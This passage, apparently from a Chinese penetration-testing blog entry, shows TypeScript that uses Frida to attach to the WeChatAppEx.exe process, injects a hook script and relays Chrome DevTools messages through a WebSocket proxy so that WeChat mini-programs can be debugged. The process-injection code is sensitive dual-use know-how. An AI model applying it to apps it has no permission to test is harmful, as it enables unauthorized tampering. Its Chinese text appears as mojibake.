class="hljs-attr">op_id</span>: <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">round</span>(<span class="hljs-number">100</span> * <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>()),<br>                    <span class="hljs-attr">payload</span>: _message_.<span class="hljs-title function_">toString</span>()<br>                &#125;;<br>                <span class="hljs-variable constant_">DEBUG</span> &amp;&amp; <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(rawPayload);<br>                <span class="hljs-keyword">const</span> wrappedData = codex.<span class="hljs-title function_">wrapDebugMessageData</span>(rawPayload, <span class="hljs-string">&quot;chromeDevtools&quot;</span>, <span class="hljs-number">0</span>);<br>                <span class="hljs-keyword">const</span> outData = &#123;<br>                    <span class="hljs-attr">seq</span>: ++messageCounter,<br>                    <span class="hljs-attr">category</span>: <span class="hljs-string">&quot;chromeDevtools&quot;</span>,<br>                    <span class="hljs-attr">data</span>: wrappedData.<span class="hljs-property">buffer</span>,<br>                    <span class="hljs-attr">compressAlgo</span>: <span class="hljs-number">0</span>,<br>                    <span class="hljs-attr">originalSize</span>: wrappedData.<span class="hljs-property">originalSize</span><br>                &#125;<br>                <span class="hljs-keyword">const</span> encodedData = messageProto.<span class="hljs-property">mmbizwxadevremote</span>.<span class="hljs-property">WARemoteDebug_DebugMessage</span>.<span class="hljs-title function_">encode</span>(outData).<span class="hljs-title function_">finish</span>();<br>                _client_.<span class="hljs-title function_">send</span>(encodedData, &#123; <span class="hljs-attr">binary</span>: <span class="hljs-literal">true</span> &#125;);<br>            &#125;<br>        &#125;);<br>    &#125;);<br>&#125;<br><br><span class="hljs-keyword">const</span> **proxy_server** = <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> wss = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocketServer</span>(&#123; <span class="hljs-attr">port</span>: <span class="hljs-variable constant_">CDP_PORT</span>, <span class="hljs-attr">host</span>: <span class="hljs-string">&#x27;0.0.0.0&#x27;</span> &#125;);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[server] proxy server running on ws://0.0.0.0:<span class="hljs-subst">$&#123;CDP_PORT&#125;</span>`</span>);<br><br>    <span class="hljs-keyword">const</span> **onMessage** = <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">_message_</span>: <span class="hljs-built_in">string</span></span>) =&gt;</span> &#123;<br>        debugMessageEmitter.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&quot;proxymessage&quot;</span>, _message_);<br>    &#125;<br><br>    wss.<span class="hljs-title function_">on</span>(<span class="hljs-string">&quot;connection&quot;</span>, <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">_ws_</span>: <span class="hljs-title class_">WebSocket</span></span>) =&gt;</span> &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[conn] CDP client connected&quot;</span>);<br>        _ws_.<span class="hljs-title function_">on</span>(<span class="hljs-string">&quot;message&quot;</span>, onMessage);<br>        _ws_.<span class="hljs-title function_">on</span>(<span class="hljs-string">&quot;error&quot;</span>, <span class="hljs-function">(<span class="hljs-params">_err_</span>) =&gt;</span> &#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&quot;[client] CDP err:&quot;</span>, _err_)&#125;);<br>        _ws_.<span class="hljs-title function_">on</span>(<span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-function">() =&gt;</span> &#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[client] CDP client disconnected&quot;</span>)&#125;);<br>    &#125;);<br><br>    debugMessageEmitter.<span class="hljs-title function_">on</span>(<span class="hljs-string">&quot;cdpmessage&quot;</span>, <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">_message_</span>: <span class="hljs-built_in">string</span></span>) =&gt;</span> &#123;<br>        wss &amp;&amp; wss.<span class="hljs-property">clients</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">_client_</span> =&gt;</span> &#123;<br>            <span class="hljs-keyword">if</span> (_client_.<span class="hljs-property">readyState</span> === <span class="hljs-title class_">WebSocket</span>.<span class="hljs-property">OPEN</span>) &#123;<br>                _<span class="hljs-comment">// send CDP message to devtools_</span><br>                _client_.<span class="hljs-title function_">send</span>(_message_);<br>            &#125;<br>        &#125;);<br>    &#125;);<br>&#125;<br><br><span class="hljs-keyword">const</span> **frida_server** = <span class="hljs-title function_">async</span> () =&gt; &#123;<br>    <span class="hljs-keyword">const</span> localDevice = <span class="hljs-keyword">await</span> frida.<span class="hljs-title function_">getLocalDevice</span>();<br>    <span class="hljs-keyword">const</span> processes = <span class="hljs-keyword">await</span> localDevice.<span class="hljs-title function_">enumerateProcesses</span>(&#123;<span class="hljs-attr">scope</span>: frida.<span class="hljs-property">Scope</span>.<span class="hljs-property">Metadata</span>&#125;);<br>    <span class="hljs-keyword">const</span> wmpfProcesses = processes.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">_process_</span> =&gt;</span> _process_.<span class="hljs-property">name</span> === <span class="hljs-string">&quot;WeChatAppEx.exe&quot;</span>);<br>    <span class="hljs-keyword">const</span> wmpfPids = wmpfProcesses.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">_p_</span> =&gt;</span> _p_.<span class="hljs-property">parameters</span>.<span class="hljs-property">ppid</span> ? _p_.<span class="hljs-property">parameters</span>.<span class="hljs-property">ppid</span> : <span class="hljs-number">0</span>);<br><br>    _<span class="hljs-comment">// find the parent process_</span><br>    <span class="hljs-keyword">const</span> wmpfPid = wmpfPids.<span class="hljs-title function_">sort</span>(<span class="hljs-function">(<span class="hljs-params">_a_, _b_</span>) =&gt;</span> wmpfPids.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">_v_</span> =&gt;</span> _v_ === _a_).<span class="hljs-property">length</span> - wmpfPids.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">_v_</span> =&gt;</span> _v_ === _b_).<span class="hljs-property">length</span>).<span class="hljs-title function_">pop</span>();<br>    <span class="hljs-keyword">if</span> (wmpfPid === <span class="hljs-literal">undefined</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;[frida] WeChatAppEx.exe process not found&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">const</span> wmpfProcess = processes.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">_process_</span> =&gt;</span> _process_.<span class="hljs-property">pid</span> === wmpfPid)[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">const</span> wmpfVersionMatch = wmpfProcess.<span class="hljs-property">parameters</span>.<span class="hljs-property">path</span> ? wmpfProcess.<span class="hljs-property">parameters</span>.<span class="hljs-property">path</span>.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/\d+/g</span>) : <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">const</span> wmpfVersion = wmpfVersionMatch ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">Number</span>(wmpfVersionMatch.<span class="hljs-title function_">pop</span>()) : <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (wmpfVersion === <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;[frida] error in find wmpf version&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    _<span class="hljs-comment">// attach to process_</span><br>    <span class="hljs-keyword">const</span> session = <span class="hljs-keyword">await</span> localDevice.<span class="hljs-title function_">attach</span>(wmpfPid);<br><br>    _<span class="hljs-comment">// find hook script_</span><br>    <span class="hljs-keyword">const</span> projectRoot = path.<span class="hljs-title function_">join</span>(path.<span class="hljs-title function_">dirname</span>(<span class="hljs-built_in">require</span>.<span class="hljs-property">main</span> &amp;&amp; <span class="hljs-built_in">require</span>.<span class="hljs-property">main</span>.<span class="hljs-property">filename</span> || process.<span class="hljs-property">mainModule</span> &amp;&amp; process.<span class="hljs-property">mainModule</span>.<span class="hljs-property">filename</span> || process.<span class="hljs-title function_">cwd</span>()), <span class="hljs-string">&quot;..&quot;</span>);<br>    <span class="hljs-keyword">let</span> <span class="hljs-attr">scriptContent</span>: <span class="hljs-built_in">string</span> | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        scriptContent = (<span class="hljs-keyword">await</span> promises.<span class="hljs-title function_">readFile</span>(path.<span class="hljs-title function_">join</span>(projectRoot, <span class="hljs-string">&quot;frida/hook.js&quot;</span>))).<span class="hljs-title function_">toString</span>();<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;[frida] hook script not found&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">let</span> <span class="hljs-attr">configContent</span>: <span class="hljs-built_in">string</span> | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        configContent = (<span class="hljs-keyword">await</span> promises.<span class="hljs-title function_">readFile</span>(path.<span class="hljs-title function_">join</span>(projectRoot, <span class="hljs-string">&quot;frida/config&quot;</span>, <span class="hljs-string">`addresses.<span class="hljs-subst">$&#123;wmpfVersion&#125;</span>.json`</span>))).<span class="hljs-title function_">toString</span>();<br>        configContent = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(configContent));<br>    &#125; <span class="hljs-keyword">catch</span>(e) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`[frida] version config not found: <span class="hljs-subst">$&#123;wmpfVersion&#125;</span>`</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (scriptContent === <span class="hljs-literal">null</span> || configContent === <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;[frida] unable to find hook script&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    _<span class="hljs-comment">// load script_</span><br>    <span class="hljs-keyword">const</span> script = <span class="hljs-keyword">await</span> session.<span class="hljs-title function_">createScript</span>(scriptContent.<span class="hljs-title function_">replace</span>(<span class="hljs-string">&quot;@@CONFIG@@&quot;</span>, configContent));<br>    script.<span class="hljs-property">message</span>.<span class="hljs-title function_">connect</span>(<span class="hljs-function"><span class="hljs-params">_message_</span> =&gt;</span> &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[frida client]&quot;</span>, _message_);<br>    &#125;);<br>    <span class="hljs-keyword">await</span> script.<span class="hljs-title function_">load</span>();<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[frida] script loaded, WMPF version: <span class="hljs-subst">$&#123;wmpfVersion&#125;</span>, pid: <span class="hljs-subst">$&#123;wmpfPid&#125;</span>`</span>);<br>&#125;<br><br><span class="hljs-keyword">const</span> **main** = <span class="hljs-title function_">async</span> () =&gt; &#123;<br>    <span class="hljs-title function_">debug_server</span>();<br>    <span class="hljs-title function_">proxy_server</span>();<br>    <span class="hljs-title function_">frida_server</span>();<br>&#125;<br><br>(<span class="hljs-title function_">async</span> () =&gt; &#123;<br>    <span class="hljs-keyword">await</span> <span class="hljs-title function_">main</span>();<br>&#125;)();<br></code></pre></td></tr></table></figure><p><strong>å¦‚æœæç¤º æ ‡ç­¾é¡µå°†å¤„äºéæ´»åŠ¨çŠ¶æ€ ï¼Œéœ€è¦å°†å°ç¨‹åºè¿›ç¨‹ç§»åŠ¨æ¡Œé¢æœ€ä¸Šå±‚</strong></p><p><img src="/img/GvMnbRfsqoeYwAxI3Pfc5btcnCd.png"></p>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€æµ‹è¯•</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è¸©å‘æ—¥è®°</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
